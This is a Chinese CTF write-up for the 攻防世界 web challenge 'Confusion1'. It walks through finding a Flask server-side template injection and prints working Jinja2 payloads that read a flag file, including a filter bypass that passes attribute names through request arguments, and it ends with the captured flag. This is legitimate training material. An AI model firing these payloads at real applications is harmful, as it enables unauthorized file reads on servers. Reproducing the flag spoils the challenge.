# 原创
：  【攻防世界WEB】难度四星12分进阶题：Confusion1

# 【攻防世界WEB】难度四星12分进阶题：Confusion1

## 三、Confusion1

> 

 

<h3>解题方法：</h3>
1、SSTI漏洞，构造payload


> 
<h3>过程：</h3>


 
大象        and        蛇（确实帅）
php+python想到了见过很多次的SSTI漏洞

<hr/>
先到处逛逛（这个里面都是一些信息）

login和register都报错
（但是这里一定是很重要的地方）

 
看robot.txt（没什么东西）


<hr/>
 考虑分析页面源码了
login.php中Ctrl+U查看页面源码
发现flag路径

 
<hr/>
分析有没有SSTI漏洞
{{1+2}}
被运算了，得出结果3

 
<hr/>
SSTI常用的注入
__class__() 返回对象的类
__base__()/__mro__() 返回类所继承的基类
__subclasses__() 返回继承类的所有子类
pyaload：
{{"".__class__.__mro__[2].__subclasses__()[40]("/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt").read()}}
被过滤了

 
<hr/>
构造payload
request 是 Flask 框架的一个全局对象 , 表示 " 当前请求的对象( flask.request ) "
request.args.key   
args是参数，key可以是内置函数
——————
payload：
{{''[request.args.a][request.args.b][2][request.args.c]()[40]('/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt')[request.args.d]()}}?&amp;a=__class__&amp;b=__mro__&amp;c=__subclasses__&amp;d=read

cyberpeace{a92d9e29b89ab062c895ddc06f237cb6} 


---


---


---

